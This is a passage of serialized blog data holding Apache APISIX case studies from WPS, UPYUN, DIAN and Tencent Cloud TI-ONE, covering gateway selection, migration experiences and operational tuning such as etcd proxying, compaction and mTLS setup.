Zhang"}],"prevItem":{"title":"Release Apache APISIX 2.10.0","permalink":"/blog/2021/09/29/release-apache-apisix-2.10"},"nextItem":{"title":"Practice in UPYUN with APISIX Ingress","permalink":"/blog/2021/09/24/youpaicloud-usercase"}},"content":"> In this article, Zhang Qiang, head of SRE network in WPS, explains how WPS can use Apache APISIX to handle Mega QPS, and update and improve gateway practices based on Apache APISIX.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nWPS is currently the largest domestic office software manufacturers, its products include WPS Office, Kdocs, Docer and so on. At the business level, deployed by thousands of businesses in a container on an internal cloud native platform, [Apache APISIX](https://apisix.apache.org/) at WPS is currently responsible for providing gateway services to the mid-stage business (Mega QPS) .\\n\\n## Gateway Evolution in WPS\\n\\nIn phase 1.0, we didn\u2019t have a strong requirement for API Gateway features, we just wanted to solve the operations problem, so we did our own research based on OpenResty and Lua to implement dynamic Upstream, blacklist, WAF and so on. Although self-developed, but left some problems in the function, such as:\\n\\n- It\u2019s only as dynamic as the Upstream dimension\\n- Need to Reload to bring out the new domain name\\n- The bottom design is simple, the function expansion ability is not strong\\n\\nFollowing the strong demand for API Gateway functionality, we began to investigate the related open source Gateway products.\\n\\n## Why Apache APISIX\uff1f\\n\\nIn fact, when the research on gateway products began in late 2019, Kong was one of the more popular choices.\\n\\nHowever, subsequent tests showed that Kong\u2019s performance was not quite up to our expectations, and we didn\u2019t think that Kong\u2019s architecture was very good: its configuration center used PostgreSQL, so Kong can only use the non-event driver to update the route, relying on each node to refresh the route.\\n\\nOn further investigation, we discovered [Apache APISIX](https://github.com/apache/apisix). First of all, Apache APISIX performs better than Kong, and there\u2019s a very detailed graph in Apache APISIX\u2019s GitHub Readme that shows the [performance of Apache APISIX Compared to Kong](https://gist.github.com/membphis/137db97a4bf64d3653aa42f3e016bd01), which are basically consistent with the data we\u2019ve tested ourselves.\\n\\n![Performance comparison between Apache APISIX and Kong](https://static.apiseven.com/202108/1632796929580-a6d7847c-bba6-4417-a7f0-9c127313264e.png)\\n\\nIn terms of architecture, Apache APISIX\u2019s ETCD configuration is a better choice for us.\\n\\n![Apache APISIX architecture](https://static.apiseven.com/202108/1632796952262-b814e37d-cbc5-43f5-b504-ab1751a9aa83.png)\\n\\nThe main reason, of course, is that we feel that community is also important. If the community is active, it will be able to update iterations, troubleshoot problems, and optimize functionality quickly. From GitHub and regular email feedback we can see that the Apache APISIX community is active, providing a strong guarantee of product functionality and stability.\\n\\n## Experience of Gateway Smooth Migration\\n\\nWhen most of my friends started working with Apache APISIX, they used the CLI to generate configurations and instances. However, during our smooth migration, we did not use the CLI to generate the configuration.\\n\\nThe main reason is that Apache APISIX does some Phase in OpenResty, such as initializing the init, init_worker, HTTP, and Upstream related phases.\\n\\nCorresponding to the Apache APISIX configuration, we found that these can be migrated from the CLI smoothly.\\n\\nSo for these reasons, we ended up doing the following smooth migration:\\n\\n- CLI generation configuration without Apache APISIX\\n- Introduce a Package Path for Apache APISIX and make Apache APISIX the Default Server\\n- KEEP domain names in other static configurations, and because the new domain name is not in the static configuration, Fallback to Apache APISIX\\n- Eventually the static configuration was migrated gradually to Apache APISIX\\n\\nOf course, in addition to the above, we recommend a \u201cLight-mixing mode\u201d that uses static configuration with Apache APISIX as Location, with some of the Phase or Lua code mentioned earlier. Doing so allows you to introduce special configurations into your static configuration, make it dynamic, etc. .\\n\\n## Shared State Improvements Based on Apache APISIX\\n\\nFirst of all, in my opinion, \u201cThe Shared State is the biggest factor in the stability of the feed, which is definitely not an issue.\u201dWhy?\\n\\nBecause forwarding efficiency can be addressed by scaling laterally, the Shared State is a critical module because it is Shared by all nodes.\\n\\nSo after using Apache APISIX, we made a few tweaks and optimizations to focus on the Shared State layer.\\n\\n### Improvement 1: Optimize ETCD Architecture with Multiple Machines Listening\\n\\nIn a typical corporate gateway architecture, multiple machines are involved, some as many as a few hundred, and each machine has to take into account the number of workers. So when multiple machines monitor the same Key, the pressure on the ETCD is greater, because one of the ETCD mechanisms is to ensure data consistency, requiring all events to be returned to the listening request before new requests can be processed, the request is discarded when the send buffer is full. So when multiple machines listen at the same time will cause the ETCD to run overtime, Overload error, and so on.\\n\\nTo solve the above problem, we use our own ETCD Proxy. The previous connection between Apache APISIX and ETCD is shown on the left side of the figure below, with each node connected to the ETCD. So as a large-scale entry, the number of connections can be particularly large, putting pressure on the ETCD.\\n\\n![etcd Proxy](https://static.apiseven.com/202108/1632796985052-c2453a37-edc1-4102-bbb7-8e03627765d5.png)\\n\\nSince we are listening to the same Key, we make a proxy to do a uniform listening and return the results to Apache APISIX when there is feedback. As shown on the right side of the image above, the ETCD Proxy component is placed between Apache APISIX and ETCD to monitor changes in Key values.\\n\\n### Improvement 2: Solve the Performance Problem During Routing Validation\\n\\nAs companies grow in size, so will the number of routes. In practice, Apache APISIX reconstructs the prefix tree used to match the route each time the route is updated. This is mainly due to poor sort performance of `table.sort`.\\n\\nIn the process of practice, we observe that the CPU of the gateway increases and the packet loss rate increases when the route is updated frequently.\\n\\n![CPU Flame Diagram](https://static.apiseven.com/202108/1632797671795-141a410b-0dd5-4873-b3dc-56f892aa2f07.png)\\n\\nIn terms of CPU ramp-up, it is clear from the flame diagram that the majority of CPU time is allocated to the `auxsort`, which is triggered by FUNCC. The FUNCC trigger also points to the problem of proving that the data did not pass through Luajit and that only the rightmost part of the graph processed normal requests.\\n\\nThe main reason for this is LuaJIT\u2019s `table.sort` doesn\u2019t rely entirely on the JIT mode, as you can see in the [Luajit wiki](http://wiki.luajit.org/NYI), so it works in the Lua code environment with low efficiency.\\n\\n![LuaJIT Wiki](https://static.apiseven.com/202108/1632797702785-9afdc28d-6c7a-4643-8cac-72b41fee8e2b.png)\\n\\nWe solved this problem ourselves using pure Lua code to implement the sort configuration for the above scenario, but Apache APISIX has since fixed the problem, the idea is similar to what we understand.\\n\\n### More Experience with Shared State\\n\\n1. When you modify Apache APISIX or do your own plug-in development, make sure you do Schema validation, including nulls, especially in the matching section. Because if something goes wrong in the matching section, it can have an impact on the whole.\\n2. Do a good job of business split planning. Plan your ETCD Prefix and IP numbers according to your traffic, and deploy more robust clusters to minimize systemic risks.\\n\\n## Open Source Discussion\\n\\n### The Trade-off Between Stability and Function\\n\\nWPS has been using Apache APISIX for almost two years now, and as a product user, I think Apache APISIX is really a stable and reliable open source product, keep up to date with the latest community releases.\\n\\nBut as anyone who has ever used an open source product will know, there will be some new features in the updated version, but there will also be some stability issues, so how do we choose between the updated version and the stability.\\n\\nThere is no universal answer to this question, but I personally feel that for Apache APISIX, try to keep up with the official version.\\n\\nAs far as the Jinshan District Office is concerned, we currently have a very high level of stability due to the large-scale use of Apache APISIX. We\u2019ve had some trouble keeping up with the official updates, so we recommend keeping up with the official version as much as possible.\\n\\nIf you\u2019re like the rest of us, you may not always be able to keep up with the official version, but you should at least be able to check out GitHub\u2019s [Master Change Log](https://github.com/apache/apisix) and other documentation on a weekly basis and keep an eye on product changes.\\n\\n### Based on Apache APISIX Production Experience\\n\\nBased on Apache APISIX, we have packaged a number of product features, such as multi-room application scaling, one-click blocking routing, and so on. In practical application, we realize that Apache APISIX is a very flexible and powerful product, so we should understand one point when we make the transition to production: powerful = unavoidable complexity and danger.\\n\\nApache APISIX itself has a lot of code design, for example, some plug-ins may need to be modified to compile their own, because after all, the respective application scenario can not be unified.\\n\\nFinally, based on the practical experience mentioned above, it is also recommended that the granularity of gateway sharing should be planned well in advance to reduce the problems of subsequent use."},{"id":"Practice in UPYUN with APISIX Ingress","metadata":{"permalink":"/blog/2021/09/24/youpaicloud-usercase","source":"@site/blog/2021/09/24/youpaicloud-usercase.md","title":"Practice in UPYUN with APISIX Ingress","description":"This article describes the update and adjustment of UPYUN\'s internal gateway architecture after you selected Apache Apisix Ingress, and shares some of the practice scenarios in use.","date":"2021-09-24T00:00:00.000Z","formattedDate":"September 24, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":8.785,"truncated":true,"authors":[{"name":"Zhuo Chen"}],"prevItem":{"title":"WPS with Apache APISIX to create new API gateway experience","permalink":"/blog/2021/09/28/wps-usercase"},"nextItem":{"title":"Apache APISIX helps DIAN to facilitate cloud native solution","permalink":"/blog/2021/09/18/xiaodian-usercase"}},"content":"> This article describes the update and adjustment of UPYUN\'s internal gateway architecture after you selected Apache Apisix Ingress, and shares some of the practice scenarios in use. Chen Zhuo, a cloud development engineer, is responsible for cloud storage, cloud processing, and gateway application development.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nThe range of Ingress products on the market has grown and the range of options has expanded considerably. These products fall into roughly two architectural categories. One, like K8s Ingress and Apache APISIX Ingress, are based on traditional agents such as Nginx and OpenResty, and use k8s-Client and Golang to do Controller. There is also an emerging class of agents and controllers using the Golang language, such as Traefik.\\n\\nIngress-Nginx is still used by most businesses in UPYUN, and the overall architecture is as follows.\\n\\n![Ingress-Nginx architecture](https://static.apiseven.com/202108/1632469775377-8303128c-e8a6-4594-a87b-ac6942f4895e.png)\\n\\nThe lower layer is data plane OpenResty. The upper Controller listens primarily for resource changes from APIServer and generates `nginx.conf` configuration file, and then Reload OpenResty. If the POD IP changes, the Upstream Upstream node replacement can be transmitted directly to the OpenResty Lua code via the HTTP interface.\\n\\nThe extensibility of Ingress-Nginx is achieved mainly through Annotations, and the configuration file itself has simple syntax and routing rules. Lua can be configured on demand, and the extension of the Lua plug in improves Operability of customization.\\n\\n![Ingress-Nginx extensibility](https://static.apiseven.com/202108/1632469835090-20c409f6-0416-4b2f-9ad7-4c836638f892.png)\\n\\nBut Ingress-Nginx has some drawbacks, such as:\\n\\n- The development of plug-ins depends on complex components, poor portability\\n- Weak semantic ability\\n- Any change to Ingress requires Reload, which is unfriendly to long links\\n\\nThese issues caused some confusion in maintaining the existing logic, so we started looking for alternatives to the relevant container gateways.\\n\\n## Research Phase\\n\\nIn choosing an alternative to Ingress-Nginx, we focused on Traefik and Apache APISIX Ingress.\\n\\n![Traefik](https://static.apiseven.com/202108/1632469875567-61dd6fbd-757f-419f-a769-99e6aaf46f0c.png)\\n\\nTraefik is cloud-native, with extremely simple configuration files, a distributed configuration, and support for a variety of automated configuration discovery. Not only support K8s, ETCD, Golang eco-language support is better, and the development cost is lower, iteration and testing ability is better. But it falls short at other levels, such as:\\n\\n- Weak expansibility\\n- Reload is not supported\\n- Not as good as Nginx in terms of performance and functionality (though it\u2019s also less expensive)\\n\\nUnlike Nginx, which is rich in plugins and instructions, you can solve a problem by adding an instruction, and you may need to pair an Nginx with Traefik when you deploy online.\\n\\nIn summary, although Traefik has advantages on operations, we are worried about its drawbacks on extension and operational efficiency concerns, so we did not choose Traefik.\\n\\n## Why Apache APISIX Ingress\\n\\n### Internal Cause\\n\\nApache APISIX\u2019s cluster of gateways, which were previously replaced from Kong, is currently hosted in multiple data centers within the company. Later, based on the Apache APISIX plug-in system, we developed some internal plug-in, such as internal permission system check, precision rate limit and so on.\\n\\n### Efficiency of Maintenance\\n\\nWe also have some K8s clusters, and the cluster gateway in these containers is using Ingress Nginx. When the plug-in system wasn\u2019t supported before, we customized some of the plug-ins on Ingress Nginx. So Apache APISIX and Nginx have a lot of overlap in their internal data center and container gateways.\\n\\nTo avoid subsequent development and maintenance, we want to replace all of the Ingress Nginx container internal gateways with Apache APISIX Ingress to achieve component unification at the gateway level.\\n\\n## Tuning Update Based on Apache APISIX Ingress\\n\\nCurrently Apache APISIX Ingress is in the early stages of UPYUN. Because of the rapid iteration of Apache APISIX Ingress, we haven\u2019t yet applied it to some important businesses, just to try it out in a new cluster.\\n\\n### Restructuring\\n\\nWith Apache APISIX Ingress, the internal architecture looks like this.\\n\\n![After using APISIX Ingress architecture](https://static.apiseven.com/202108/1632469909488-3685d104-e458-4145-8ccb-6cecbd383161.png)\\n\\nUnlike the aforementioned Ingress-Nginx architecture, the underlying data surface has been replaced with the Apache APISIX cluster. The upper Controller listens for APIServer changes and then distributes the configuration resources through the ETCD to all nodes in the entire Apache APISIX cluster.\\n\\n![Profile comparison](https://static.apiseven.com/202108/1632469956257-b9cb6a91-a082-437c-9395-d62ffb75280f.png)\\n\\nBecause Apache APISIX supports dynamic routing changes, it is different from Ingress-Nginx on the right. In Apache APISIX, the same Location is used when traffic enters, and routing is done in Lua Code, which is easy to deploy. And the right Ingress-Nginx compared to its `nginx.conf` configuration file is complex and requires a Reload for every Ingress change.\\n\\n### Apache APISIX Ingress Controller\\n\\nApache APISIX Ingress Controller relies on Apache APISIX\u2019s dynamic routing capabilities for its functional implementation. It monitors resource changes at APIServer, performs data structure conversion, data validation, and DIFF computation, and finally applies it to the Apache APISIX Admin API.\\n\\nApache APISIX Ingress Controller also has a highly available scheme, implemented directly through the leader-election mechanism of K8s, without the need to introduce additional external components.\\n\\n#### Declarative Configuration\\n\\nCurrently Apache APISIX Ingress Controller supports two declarative configurations, Ingress Resource and CRD Resource. The former is more suitable for the replacement of gateway controls from Ingress-Nginx and is the most cost-effective in terms of conversion costs. However, its shortcomings are obvious, such as too weak semantic ability, no specific specifications, and capacity development can only be achieved through annotations.\\n\\n![Ingress Resource](https://static.apiseven.com/202108/1632469994485-209d3a21-d761-4b2c-a974-c913b443b0d2.png)\\n\\nUPYUN selected the second declarative configuration, the more semantic CRD Resource. Structured data can be configured this way, with the capabilities that Apache APISIX supports.\\n\\n![CRD Resource](https://static.apiseven.com/202108/1632470033850-b619da2f-5926-44ca-95bb-69ee1cdaf209.png)\\n\\nIf you want to learn more about Apache APISIX Ingress Controller dry goods, see Apache Apisix PMC Zhang Chao\u2019s [sharing video](https://www.bilibili.com/video/BV1eB4y1u7i1?spm_id_from=333.999.0.0) on Meetup.\\n\\n### Functional Enhancement\\n\\n#### Effect 1: Log Level Efficiency\\n\\nWe currently have multiple Apache APISIX clusters in our company, including the data center gateway and the container gateway that all started using Apache APISIX uniformly so that they can be consolidated into a set of logic for subsequent processing/consumption of related logs.\\n\\n![Log level](https://static.apiseven.com/202108/1632470075980-46d13ac7-babb-40a5-b105-73f1105d16e7.png)\\n\\nOf course, Apache APISIX\u2019s logging plug-in support is also very rich. Internally we use Kafka-Logger, which allows you to customize the log format. Like the other log plug-ins in the figure below, custom formats may not yet be supported due to the number of users, partners with relevant needs are welcome to use and submit PR to extend the current logging plug-in functionality.\\n\\n![Plug-in list](https://static.apiseven.com/202108/1632470099306-ffc74dfb-384b-4014-a0b4-14267dcf7bce.png)\\n\\n#### Effect Two: Improve the Monitoring and Health Check\\n\\nAt the monitoring level, Apache APISIX also supports Prometheus, SkyWalking, and so on, and we use Prometheus internally.\\n\\nApache APISIX is a basic proxy for the monitoring and request of APP status codes. But Apache APISIX\u2019s own health checks are not well controlled. What we\u2019re doing now is deploying a service inside K8s and generating multiple pods, applying that service to Apache APISIX Ingress, and then checking the entire link to see if Apache APISIX is healthy.\\n\\n![Health check](https://static.apiseven.com/202108/1632470120106-3e577e2e-ea43-4f50-8e3c-066b5f1e7238.png)\\n\\n## Practice the Solution Using Apache APISIX Ingress\\n\\n### Scenario 1: K8s Application Changes\\n\\nIn using K8s with Apache APISIX Ingress, you need to do the following:\\n\\n- The selection of update strategy suggests using rolling update to ensure that most of the POD is available, but also need to consider the problem of stable load\\n- We should start K8s internal health check for POD to ensure the business availability of POD and avoid the POD being unable to provide the normal service after the request\\n- Make most endpoints available on Apache APISIX Upstream\\n\\nIn practice, we also encounter the problem of transmission delay. The POD update path is shown below, after the POD Ready through the layer-by-layer steps of information transfer, some of the links in the middle may appear delay problems. In some extreme cases, the link time may be increased by a few seconds and the Endpoint update may not be up to date.\\n\\n![Link issue](https://static.apiseven.com/202108/1632470165257-cb16e489-b546-4451-917a-6c72648769d8.png)\\n\\nThe solution in this case is to wait a few seconds after the first batch of POD becomes Ready before continuing with the next batch when the update occurs. The goal is to ensure that most endpoints in the Apache APISIX Upstream are available.\\n\\n### Scenario 2: Upstream Health Screening Problem\\n\\nDue to APIServer\u2019s state-oriented design, there are also latency issues when synchronizing with Apache APISIX, which can result in \u201c502 error status warnings\u201dduring the update process. Problems like this require a health check at the gateway level for the Upstream Endpoint.\\n\\nFirst of all, an Upstream Endpoint health check is not practical because Endpoint is too time consuming. The monitoring check at the HTTP layer is not suitable for the operation because the status code can not be determined.\\n\\nThe best way to do this is to do a passive health check based on TCP at the gateway level. If your network connection time out is not reachable, consider the POD as a problem that needs to be degraded. This allows for independent control without touching other parts of the business, as long as you check at the TCP level.\\n\\n### Scenario\uff1amTLS Connecting to ETCD\\n\\nBecause the Apache APISIX cluster uses one-way authentication by default, using Apache APISIX as a container gateway might turn on two-way authentication by default when connecting to the same ETCD cluster with K8s (which uses two-way authentication in K8s ETCD) , this in turn led to the following certificate issues:\\n\\n![Certificate issues](https://static.apiseven.com/202108/1632470191228-5c2a3666-8d21-4b19-a5be-e09e7db4d488.png)\\n\\nInstead of connecting directly to the ETCD via gRPC, Apache APISIX first connects to the gRPC-gateway inside the ETCD via the HTTP protocol, and then to the real gRPC Server. There\u2019s an extra component in the middle, so there\u2019s an extra two-way validation.\\n\\nA client certificate is required when the gRPC-gateway connects to the gRPC Server. The ETCD does not provide a configuration for this certificate, but uses the Server certificate of the gRPC Server directly. This is equivalent to a certificate being validated both on the client and the server. If your gRPC server server-side certificate has an extension enabled (indicating that the certificate can only be used for server-side validation) , remove the extension, or add an extension that can also be used for client-side validation.\\n\\nAt the same time, the bottom layer of OpenResty does not support mTLS. When you need to connect to an upstream service or ETCD via mTLS, you need to use apisix-nginx-module to build an OpenResty after patch. Apisix-build-tools can find related build scripts.\\n\\n## Future Expectations\\n\\nWhile we are currently only using Apache APISIX Ingress in the testing phase, we believe that in the near future, with the application of an iterative feature update and internal architecture migration, apache APISIX Ingress will be applied uniformly to all container gateways to UPYUN."},{"id":"Apache APISIX helps DIAN to facilitate cloud native solution","metadata":{"permalink":"/blog/2021/09/18/xiaodian-usercase","source":"@site/blog/2021/09/18/xiaodian-usercase.md","title":"Apache APISIX helps DIAN to facilitate cloud native solution","description":"This article introduces the background and practice of using the cloud native API gateway Apache APISIX to build the cloud native project in DIAN.","date":"2021-09-18T00:00:00.000Z","formattedDate":"September 18, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.075,"truncated":true,"authors":[{"name":"Ran Sun"}],"prevItem":{"title":"Practice in UPYUN with APISIX Ingress","permalink":"/blog/2021/09/24/youpaicloud-usercase"},"nextItem":{"title":"Implementing Apache APISIX in Tencent Cloud TI-ONE Platform","permalink":"/blog/2021/09/16/tencent-cloud"}},"content":"> This article introduces the background and practice of using Apache APISIX to build the cloud native project in DIAN. The author is Sun ran, an expert in operation and maintenance. Currently working in DIAN, mainly responsible for the deployment of K8s cluster and API Gateway.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background\\n\\nAs a domestic service platform for sharing chargers, DIAN is still in its initial stage. From the aspects of operation and maintenance system, test environment and so on, the business of the current product mainly faces the following problems:\\n\\n- Traditional VM mode deployment, low utilization and not easy to expand\\n- Sharing resources among Developers and QAs are difficult\\n- Multiple independent test environments (K8s) that repeat maintenance steps for each deployment are inefficient\\n- Using Nginx configuration management, operating costs are extremely high\\n\\nAt the beginning of 2020, we decided to launch the containerization project with the intention of finding an existing solution to solve the above problems.\\n\\nCurrently, companies are looking to \u201cEmbrace cloud native\u201das a solution for future business, focusing on micro-service re-engineering in cloud native mode, DevOps, continuous delivery, and most importantly, containerization.\\n\\n![Why choose Cloud Native](https://static.apiseven.com/202108/1646623804095-4f89cc3d-685f-44e3-8a17-51fb55526677.png)\\n\\n## Why Need Apache APISIX\\n\\nBased on the above selection of cloud native mode, we started to build the containerized solution. The programme has three main components:\\n\\n1. **Self-developed Devops platform-DNA**: this platform is mainly used for project management, change management (pre-release, production environment) , application lifecycle management (DNA Operator) , and CI/CD related functionality.\\n2. **Isolation based on K8s Namespace**: previously all of our development project environments, including change environments, were all registered together, so isolation between environment and environment became a necessary part of our processing.\\n3. **Dynamic management routing gateway access layer**: considering the internal multi-application and multi-environment, it is necessary to have a dynamic management gateway access layer to deal with the relevant operations.\\n\\n### Gateway Selection\\n\\nFor gateway selection, we compared OpenShift Route, Nginx Ingress, and Apache APISIX.\\n\\nOpenShift 3.0 introduced OpenShift Route to Route traffic for external stack requests by providing the Ingress Controller through the Ingress Operator for Kubernetes. But in the follow-up test, the function support aspect is not perfect and the maintenance cost is very high. Nginx Ingres also has a similar problem with high operating and operation costs.\\n\\nDuring our research with Apache APISIX, we found that the core of Apache APISIX is to provide routing and load balancing capabilities, as well as support:\\n\\n- Dynamic route loading and real-time update\\n- Stateless high availability mode in ETCD storage\\n- Lateral spread\\n- Cross-resource sharing (CORS) , Proxy Rewrite plug-in\\n- API calls and automation settings\\n- Dashboard is clean and easy to use\\n\\nOf course, as an open source project, Apache APISIX has a very active community and is in line with our trend to pursue cloud native, taking into account our application scenarios and Apache APISIX\u2019s product strengths, finally, replace all routes in the project environment with Apache APISIX.\\n\\n## Changes with Apache APISIX\\n\\n### Overall Architecture\\n\\nOur current product architecture is broadly similar to using Apache APISIX in K8s. The main idea is to expose Apache APISIX\u2019s Service as a LoadBalancer type. The user then transfers the request access to Apache APISIX and forwards the route to the upstream related service.\\n\\n![Overall architecture](https://static.apiseven.com/2021/0918/20220816-171733.jpg)\\n\\nOne additional point is why we put the ETCD outside the technology stack. The ETCD was taken out separately because of errors in resolving domain names in earlier versions, and because the internal maintenance and backup process was cumbersome.\\n\\n### Business Model\\n\\n![Business model](https://static.apiseven.com/2021/0918/20220816-172217.jpg)\\n\\nThe image above shows the business environment transformation model after accessing Apache APISIX. As each development or project changes, the DNA creates a change and converts it into a K8s Namespace resource.\\n\\nBecause K8s Namespace is resource-isolated in and of itself, we provide multiple sets of project change environments based on Namespace at deployment time, including copies of all applications and registering to the same Eureka. We\u2019ve modified Eureka to allow it to support the separation of application replicas of different namespaces so that they don\u2019t call each other.\\n\\n### Function Enhancement\\n\\nWith the above architecture and business model in practice, each project change generates a corresponding Namespace resource, while the DNA Operator creates the corresponding APP resource, and finally generates the corresponding Apache APISIX routing rules.\\n\\n#### Function 1: Project Changes to More Environments\\n\\nIn a change environment we have two scenarios, one is point-to-point mode, where one domain name corresponds to one application. Simply by enabling the domain name, Apache APISIX is used in the DNA to generate the corresponding route, which is the single path routing rule.\\n\\n![Point-to-Point mode](https://static.apiseven.com/202108/1646623778769-ae05d742-8f31-4272-94e0-5d3266d0c9b7.png)\\n\\nAnother scenario is multilevel path routing. In this scenario, we use Apache APISIX to point multiple APP routes required in project changes to the current Namespace environment, and their associated APP routes to a Stable set of Namespace environments (usually Stable) .\\n\\n![Multilevel path](https://static.apiseven.com/2021/0918/20220816-172458.jpg)\\n\\n#### Function 2: Automate the Process\\n\\nBased on some routing rules of the above project environment, Apache APISIX\u2019s API call function is used as a control center, and some functions including domain name prefix and corresponding application instance are collected.\\n\\nFor example, when a new application comes online, you can request a corresponding routing rule and add it to the control center. When you need to request routing, you can enable this routing rule with one click and automatically synchronize to Apache APISIX.\\n\\n![Automated process](https://static.apiseven.com/202108/1646623758208-09d6dfef-677b-47df-919e-99c3b0794e04.png)\\n\\nWe also provide a single common routing request, including online and test environments, or some public network exposure and test requirements, and call the Apache APISIX interface.\\n\\n![Ordinary route](https://static.apiseven.com/202108/1646623778763-0951ede3-1c58-46dd-b4ee-6ac9f977e636.png)\\n\\n## Practice Based on Apache APISIX\\n\\n### OpenShift Based Deployment\\n\\nOpenShift has a very strict SCC mechanism, and there are many problems with deploying Apache APISIX with OpenShift, so you have to recompile every release.\\n\\nAlso, based on the Docker mirroring provided by Apache APISIX, we updated some of the basic software on a daily basis, such as tuning and problem viewing, and uploaded it to the internal Image repository via Image Rebuild.\\n\\n### Cross-version Smoothing\\n\\nWe started with Apache APISIX at version 1.5, and in the process of updating to the latest version, we experienced things like ETCD V2 performance degradation and increased strong validation of the CORS plug-in.\\n\\n![Cross smooth](https://static.apiseven.com/202108/1632294589632-e113850d-57a6-4a82-be21-63ec8e78f842.png)\\n\\nBased on this, we take the solution of version cut flow, new version enable and create new Service and expose relevant SLB information. Switch the Gateway to the new version of Apache APISIX using the Selector property of the Service. On the other hand, we will also split the traffic, some of the traffic through DNS resolution to the new version of Apache APISIX SLB address, to achieve a smooth version of the process.\\n\\n### Solve the ETCD Compression Problem\\n\\nDuring the use period, we also observed that the Load has been suddenly high. After checking, we found that the amount of data in the ETCD has reached more than 600 megabytes, so we took the measure of compressing the ETCD regularly, wIPE out all historical data. The code can be found at:\\n\\n```sh\\n$ ETCDCTL_API=3 etcdctl --endpoints=http://etcd-1:2379 compact 1693729\\n$ ETCDCTL_API=3 etcdctl --endpoints=http://etcd-1:2379 defrag\\n```\\n\\n### Get Client-IP\\n\\nIn the online business scenario, we need to get the source IP to do the relevant business processing. Apache APISIX provides the \u201cX-Real-IP\u201dcapability to do this by configuring real and enabling Local mode of externalTrafficPolicy.\\n\\n## Future Expectations\\n\\nAs we all know, DIAN is now the main business scenario for sharing chargers, so in the property is also partial to the direction of the Internet of things.\\n\\nFrom the business level, we also have some important business such as MQTT type applications. They are currently exposed in the container in SLB mode and hopefully can be plugged into the entire Apache APISIX cluster in the future.\\n\\nAt the front-end level, the current front-end application is still in a container, and we intend to connect the front-end application directly to Apache APISIX via Proxy Rewrite plug-in to our Ali Cloud OSS domain name. This saves the resources for container deployment and makes it easier to manage.\\n\\nOn the Apache APISIX project, we have also developed a number of practical deployment requirements, in the hope that subsequent changes in the Apache APISIX version can support or improve related functions. For example:\\n\\n1. Add multi-cluster functionality at the technical management level\\n2. More fine-grained user rights management at the development level\\n3. Feature level support for SSL certificate rolling updates\\n4. Apache APISIX-Ingress-Controller related business access"},{"id":"Implementing Apache APISIX in Tencent Cloud TI-ONE Platform","metadata":{"permalink":"/blog/2021/09/16/tencent-cloud","source":"@site/blog/2021/09/16/tencent-cloud.md","title":"Implementing Apache APISIX in Tencent Cloud TI-ONE Platform","description":"This article mainly introduces the enterprise case of Tencent Cloud Intelligent Titanium Platform using the cloud-native API gateway Apache APISIX.","date":"2021-09-16T00:00:00.000Z","formattedDate":"September 16, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":5.49,"truncated":true,"authors":[{"name":"Shoujun Diao"}],"prevItem":{"title":"Apache APISIX helps DIAN to facilitate cloud native solution","permalink":"/blog/2021/09/18/xiaodian-usercase"},"nextItem":{"title":"BiWeekly Report (Aug 30 - Sep 15)","permalink":"/blog/2021/09/15/weekly-report"}},"content":"> This article is a practical case of implementing Apache APISIX in Tencent Cloud\u2019s production environment.\\n\\n\x3c!--truncate--\x3e\\n\\n## Background Information\\n\\nTencent Cloud Intelligent Titanium Machine Learning Platform (TI-ONE) is a machine learning service platform for AI engineers, providing users with full-process development support from data pre-processing, model building, model training to model evaluation. TI-ONE has rich built-in algorithm components and supports multiple algorithm frameworks to meet the needs of various AI application scenarios.\\n\\n![TI-ONE Architecture](https://static.apiseven.com/202108/1646830304750-e4716cb4-9024-4995-a910-ad3ddd5d00a9.png)\\n\\n## What Does TI-ONE Need from Apache APISIX?\\n\\nWe divide the requirements into two categories: technical needs, i.e. the requirements of the R&D team for the API gateway; and business needs, i.e. the requirements of the users of the TI-ONE for the API gateway.\\n\\nThe main requirement at the technical aspect is to have cross-sectional functionality. Specifically, cross-plane functions such as authentication, flow limit, logging, monitoring, etc. are coalesced into the API gateway to decouple the back-end services, so that R&D can focus on function development and reduce maintenance costs.\\n\\nConsidering the demand of subsequent business connection to Tencent Cloud, the API gateway must support Tencent\u2019s customized authentication and login mechanism and comply with Tencent Cloud API 3.0 format.\\n\\n![TI-ONE\'s Technical Needs](https://static.apiseven.com/202108/1646830304728-8be486b7-80e9-4b07-8a02-2c753f70c6d1.png)\\n\\nFrom the business aspect, the main consideration is user perception. When the platform is developed, AI and algorithm colleagues need an interactive programming environment, and then the API gateway needs to support Notebook. It also needs to support request-level monitoring, including logging monitoring and metrics monitoring.\\n\\nWe conducted research on API Gateway products to address the above requirements.\\n\\n![TI-ONE\'s requirements on  API Gateway](https://static.apiseven.com/202108/1646830304731-719124e9-8206-4ffb-8be1-eb54c7c0e159.png)\\n\\n## Research and Compare Products\\n\\nWe have compared Envoy, Kong and Apache APISIX from multiple dimensions in our research stage.\\n\\n![Envoy, Kong and Apache APISIX Comparison](https://static.apiseven.com/202108/1646830766533-be5642c4-04d3-4999-8c0a-07116f0c08c7.png)\\n\\nSince Envoy\u2019s technology stack is C++, it is likely that we will have to look at the C++ source code when we need to locate the problem. It is very likely to bring us some extra problems, so Envoy was eliminated from our options in the early stage.\\n\\nKong and Apache APISIX use the same technology stack, OpenResty, but in the storage dependency aspect, Kong relies on PostgreSQL, a relational database, which is a very complex database to configure for high availability in the software industry. Not only do you need to have a dedicated DBA, but it is also very difficult to implement. Relational databases are too heavy, and we don\u2019t need to use them to guarantee ACID and MVCC.\\n\\n### Why Did TI-ONE Choose Apache APISIX?\\n\\nApache APISIX does a very good job of storing dependencies and routing rules, which is a good fit for our business scenario. Our business values routing flexibility and routing matching algorithms over other features. The complexity of Apache APISIX route matching algorithm is significantly better than Kong, and the configuration effective time is less than 1ms, and the single-core QPS is much higher than Kong.\\n\\n## Architecture Alignment Based on Apache APISIX\\n\\nAfter connecting to Apache APISIX, we have completed the gateway aspect of TI-ONE, which solves the previous requirements about technical and business level.\\n\\nApache APISIX supports http+pb, http+json, gRPC, WebSocket and other traffic. After these traffic flows go through Apache APISIX, they will go to some components custom-developed by TI-ONE.\\n\\n![Apache APISIX Architecture](https://static.apiseven.com/202108/1646830304733-0ccfe462-0214-430e-8316-079cc0e0d4de.png)\\n\\nThe business of TI-ONE is deployed on Tencent Cloud TKE platform. In order to improve its availability, the gateway, 